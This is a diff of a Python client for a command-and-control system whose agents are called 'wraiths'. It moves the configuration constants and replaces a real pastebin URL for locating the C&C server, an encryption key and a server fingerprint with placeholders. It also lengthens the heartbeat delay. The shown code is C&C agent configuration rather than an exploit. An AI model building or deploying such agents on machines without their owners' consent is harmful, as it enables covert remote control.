@@ -1,5 +1,39 @@
 #!/usr/bin/python3
 
+# START CONSTANTS
+
+# Define some constants
+# The URL where the URL of the C&C server is found. This option was added
+# to allow the C&C URL to change without having to re-install all wraiths.
+# This could be a link to pastebin for example containing simply the URL of the
+# API.
+FETCH_SERVER_LOCATION_URL = "SomeURL"
+# A key used to encrypt the first packet before a new key is sent over by the
+# server. Not the most secure communication, I know. However, wraiths can
+# (and should) work over SSL and so can the panel so the security
+# of this system is not critical
+CRYPT_KEY = "SomeKey"
+# The fingerprint of the server to trust. This prevents the wraith from
+# accidentally connecting and sending info to the wrong server if the
+# URL is wrong
+TRUSTED_SERVER = "SomeFingerprint"
+# Port used by the wraith on localhost to check if other wraiths are currently
+# running. We don't want duplicates. The port can be any valid port number
+# which is unlikely to be taken by other processes.
+NON_DUPLICATE_CHECK_PORT = 47405
+# Whether to log the interactions with the server to the console.
+# Not recommended except for debugging
+DEBUG_MODE = False
+# Whether to act as a watchdog and spawn children as the wraiths.
+# This feature is experimental and does not seem to work when "freezing"
+# the wraith (pyinstaller etc.)
+START_AS_WATCHDOG = False
+# DO NOT EDIT
+# This is for keeping track of the wraith version for the panel
+WRAITH_VERSION = "3.0.0"
+
+# END CONSTANTS
+
 # Required libs
 from aes import AesEncryption as aes  # From the same dir as this file
 import requests
@@ -26,36 +60,8 @@ import pyautogui
 
 overall_start_time = time.time()
 
-# START CONSTANTS
-
-# Define some constants
-# The URL where the URL of the C&C server is found. This option was added
-# to allow the C&C URL to change without having to re-install all wraiths
-FETCH_SERVER_LOCATION_URL = "https://pastebin.com/raw/a4B2cfwY"
-# A key used to encrypt the first packet before a new key is sent over by the
-# server. Not the most secure communication, I know. However, wraiths can
-# (and should) work over SSL and so can the panel so the security
-# of this system is not critical
-CRYPT_KEY = "G39UHG83H2F92JC9H92VJ29W9HCG9WMHG2F1ZE10SKXQCSPKNXKZNBDCOG0Y"
-# The fingerprint of the server to trust. This prevents the wraith from
-# accidentally connecting and sending info to the wrong server if the
-# URL is wrong
-TRUSTED_SERVER = "VWIVWNODCOWQPSPL"
-# Port used by the wraith on localhost to check if other wraiths are currently
-# running. We don't want duplicates. The port can be any valid port number
-# which is unlikely to be taken by other processes.
-NON_DUPLICATE_CHECK_PORT = 47402
-# Whether to log the interactions with the server to the console.
-# Not recommended except for debugging
-DEBUG_MODE = False
-# Whether to act as a watchdog and spawn children as the wraiths
-START_AS_WATCHDOG = False
-# DO NOT EDIT
-# This is for keeping track of the wraith version for the panel
-WRAITH_VERSION = "3.0.0"
-
-# END CONSTANTS
-
+# Starts the program as a watchdog and the children as
+# wraiths. Warning: experimental
 if START_AS_WATCHDOG:
     if DEBUG_MODE: print("Starting as Watchdog")
     # Define a function to check if the single instance socket is taken
@@ -289,4 +295,4 @@ while True:
         wraith.command_queue = []
 
     # Delay sending hearbeats to prevent DDoSing our own server
-    time.sleep(3.2)
+    time.sleep(3.5)
